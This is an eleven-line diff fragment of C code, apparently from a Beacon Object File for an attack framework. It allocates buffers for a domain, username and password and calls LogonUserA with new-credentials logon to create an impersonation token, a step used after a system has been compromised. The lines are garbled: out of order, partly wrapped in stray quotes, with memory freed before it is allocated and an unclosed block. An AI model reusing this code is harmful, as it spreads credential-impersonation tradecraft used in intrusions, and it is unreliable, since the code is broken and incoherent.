@@ -1,0 +1,11 @@
+		BeaconFormatFree(gIdentityCredentialsParser);
+	// Free the memory allocated for the credentials format.
+	gIdentityCredentialsParser = BeaconDataAlloc(2048);
+	if (gIdentityCredentialsParser) {
+"			LOGON_NETCREDENTIALS_ONLY,"
+"		LOGON_NETCREDENTIALS_ONLY,"
+"	gIdentityDomain = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_DOMAIN * sizeof(WCHAR));"
+"	gIdentityPassword = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_PASSWORD * sizeof(WCHAR));"
+"	gIdentityUsername = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_USERNAME * sizeof(WCHAR));"
+"	if(!LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &gIdentityToken))"
+datap* gIdentityCredentialsParser;
